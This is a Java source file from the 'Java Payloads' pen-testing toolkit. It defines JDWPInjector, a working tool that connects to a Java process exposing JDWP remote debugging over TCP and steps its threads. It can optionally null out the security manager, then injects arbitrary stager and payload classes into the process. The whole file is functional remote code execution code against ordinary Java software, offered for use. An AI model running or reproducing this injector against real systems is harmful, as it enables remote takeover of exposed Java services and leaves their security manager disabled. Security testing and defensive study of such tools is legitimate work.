/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.builder;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.PrintStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

import javapayload.Parameter;
import javapayload.handler.stager.PollingTunnel;
import javapayload.handler.stager.StagerHandler;
import javapayload.handler.stager.StagerHandler.Loader;
import javapayload.loader.DynLoader;

import com.sun.jdi.ClassType;
import com.sun.jdi.ThreadReference;
import com.sun.jdi.VirtualMachine;
import com.sun.jdi.VirtualMachineManager;
import com.sun.jdi.connect.AttachingConnector;
import com.sun.jdi.connect.ListeningConnector;
import com.sun.jdi.connect.Connector.Argument;
import com.sun.jdi.event.Event;
import com.sun.jdi.event.EventIterator;
import com.sun.jdi.event.EventSet;
import com.sun.jdi.event.StepEvent;
import com.sun.jdi.request.StepRequest;

public class JDWPInjector extends Injector {

	public static ClassType inject(VirtualMachine vm, byte[][] classes, String embeddedArgs, boolean disableSecurityManager, PrintStream consoleOut) throws Exception {
		ClassType result = null;
		consoleOut.println("== Preparing...");
		if (vm.eventRequestManager().stepRequests().size() > 0) {
			throw new RuntimeException("Some threads are currently stepping");
		}
		for (int i = 0; i < vm.allThreads().size(); i++) {
			final ThreadReference tr = (ThreadReference) vm.allThreads().get(i);
			vm.eventRequestManager().createStepRequest(tr, StepRequest.STEP_MIN, StepRequest.STEP_INTO).enable();
		}
		final com.sun.jdi.event.EventQueue q = vm.eventQueue();
		boolean done = false;
		consoleOut.println("== Handling events...");
		vm.resume();
		while (true) {
			final EventSet es;
			if (!done) {
				es = q.remove();
			} else {
				es = q.remove(1000);
				if (es == null) {
					break;
				}
			}
			for (final EventIterator ei = es.eventIterator(); ei.hasNext();) {
				final Event e = ei.nextEvent();
				consoleOut.println("== Event received: " + e.toString());
				if (!done && e instanceof StepEvent) {
					final StepEvent se = (StepEvent) e;
					final ThreadReference tr = se.thread();
					vm.eventRequestManager().deleteEventRequest(se.request());
					final List stepRequests = new ArrayList(vm.eventRequestManager().stepRequests());
					for (int i = 0; i < stepRequests.size(); i++) {
						((StepRequest) stepRequests.get(i)).disable();
					}
					if (disableSecurityManager) {
						consoleOut.println("== Disabling security manager...");
						ClassType _System = (ClassType) vm.classesByName("java.lang.System").get(0);
						_System.setValue(_System.fieldByName("security"), null);
					}
					consoleOut.println("== Trying to inject...");
					try {
						final JDWPClassInjector ci = new JDWPClassInjector(tr);
						for (int i = 0; i < classes.length; i++) {
							ClassType ct = ci.inject(classes[i], i == classes.length - 1 ? embeddedArgs : null);
							if (i==0) result = ct;
						}
						consoleOut.println("== done.");
						done = true;
						for (int i = 0; i < stepRequests.size(); i++) {
							vm.eventRequestManager().deleteEventRequest((StepRequest) stepRequests.get(i));
						}
					} catch (final Throwable ex) {
						ex.printStackTrace();
						for (int i = 0; i < stepRequests.size(); i++) {
							((StepRequest) stepRequests.get(i)).enable();
						}
					}
				}
			}
			es.resume();
		}
		return result;
	}

	/** @deprecated */
	public static void main(String[] args) throws Exception {
		if (args.length < 4) {
			System.out.println("Usage: java javapayload.builder.JDWPInjector <port|hostname:port|port!|hostname:port!> <stager> [stageroptions] -- <stage> [stageoptions]");
			return;
		}
		new JDWPInjector().inject(args);
	}

	public JDWPInjector() {
		super("Inject a payload into a JDWP debug agent", 
				"This injector is used to inject a payload into a java process that has\r\n" +
				"remote debugging via JDWP over TCP enabled. In this case, an attacker can\r\n" +
				"inject arbitrary bytecode, including loading new classes.\r\n" +
				"\r\n" +
				"If the target process has a security manager installed, loading the stage\r\n" +
				"will most likely fail.\r\n" + 
				"In that case you can add an exclamation mark to the connector specification\r\n" +
				"(like \"2010!\") to deactivate the security manager in the target process.\r\n" +
				"Note that in this case the security manager will remain disabled even after\r\n" +
				"your payload terminates, so make sure to not open additional security holes\r\n" +
				"in your pen-test when trying this!");
	}
	
	public void inject(String[] parameters, Loader loader, String[] stagerArgs) throws Exception {
		inject(parameters[0], loader, stagerArgs);
	}
	
	public Parameter[] getParameters() {
		return new Parameter[] {
			new Parameter("CONNECTOR", false, Parameter.TYPE_ANY, "Method to connect to the JDWP agent, like [<hostname>:]<port>[!]")
		};
	}
	
	public static void inject(String connector, final StagerHandler.Loader loader, String[] stagerArgs) throws Exception {
		final String stager = stagerArgs[0];
		final VirtualMachineManager vmm = com.sun.jdi.Bootstrap.virtualMachineManager();
		VirtualMachine vm = null;
		boolean disableSecurityManager = false;
		if (connector.endsWith("!")) {
			disableSecurityManager = true;
			connector = connector.substring(0, connector.length()-1);
		}
		final int pos = connector.lastIndexOf(':');
		if (pos == -1) {
			final int port = Integer.parseInt(connector);
			for (int i = 0; i < vmm.listeningConnectors().size(); i++) {
				final ListeningConnector lc = (ListeningConnector) vmm.listeningConnectors().get(i);
				if (lc.name().equals("com.sun.jdi.SocketListen")) {
					final Map connectorArgs = lc.defaultArguments();
					((Argument) connectorArgs.get("port")).setValue("" + port);
					lc.startListening(connectorArgs);
					vm = lc.accept(connectorArgs);
					lc.stopListening(connectorArgs);
				}
			}
		} else {
			final int port = Integer.parseInt(connector.substring(pos + 1));
			for (int i = 0; i < vmm.attachingConnectors().size(); i++) {
				final AttachingConnector ac = (AttachingConnector) vmm.attachingConnectors().get(i);
				if (ac.name().equals("com.sun.jdi.SocketAttach")) {
					final Map connectorArgs = ac.defaultArguments();
					((Argument) connectorArgs.get("hostname")).setValue(connector.substring(0, pos));
					((Argument) connectorArgs.get("port")).setValue("" + port);
					vm = ac.attach(connectorArgs);
					break;
				}
			}
		}
		boolean isJDWPTunnelStager = loader.canHandleExtraArg(ClassType.class);
		boolean isPollingTunnelStager = loader.canHandleExtraArg(PollingTunnel.CommunicationInterface.class);
		loader.handleBefore(loader.stageHandler.consoleErr, null); // may modify stagerArgs
		final StringBuffer embeddedArgs = new StringBuffer();
		for (int i = 0; i < stagerArgs.length; i++) {
			if (i != 0) {
				embeddedArgs.append("\n");
			}
			embeddedArgs.append("$").append(stagerArgs[i]);
		}
		if (isPollingTunnelStager)
			embeddedArgs.append("\n$-WAITLOOP-");
		Class[] classes = new Class[] { 
				javapayload.stager.Stager.class,
				DynLoader.loadStager(stager, stagerArgs, 0),
				javapayload.loader.JDWPLoader.class
		};
		if (isJDWPTunnelStager) {
			classes = new Class[] {
					javapayload.loader.JDWPCommunication.class,
					javapayload.stager.Stager.class,
					classes[1], 
					javapayload.loader.JDWPLoader.class
			};
		}
		final byte[][] classBytes = new byte[classes.length][];
		for (int i = 0; i < classes.length; i++) {
			final InputStream in = classes[i].getResourceAsStream("/" + classes[i].getName().replace('.', '/') + ".class");
			final ByteArrayOutputStream out = new ByteArrayOutputStream();
			final byte[] tmp = new byte[4096];
			int len;
			while ((len = in.read(tmp)) != -1) {
				out.write(tmp, 0, len);
			}
			in.close();
			out.close();
			classBytes[i] = out.toByteArray();
			if (classBytes[i] == null) {
				throw new RuntimeException();
			}
		}
		ClassType firstInjectedClass = inject(vm, classBytes, embeddedArgs.toString(), disableSecurityManager, loader.stageHandler.consoleOut);

		if (isJDWPTunnelStager) {
			loader.handleAfter(loader.stageHandler.consoleErr, firstInjectedClass);
		} else if (isPollingTunnelStager) {
			loader.handleAfter(loader.stageHandler.consoleErr, new JDWPPollingCommunicationInterface(vm, loader.stageHandler.consoleErr));
		} else {
			vm.dispose();
			loader.handleAfter(loader.stageHandler.consoleErr, null);
		}
	}
}
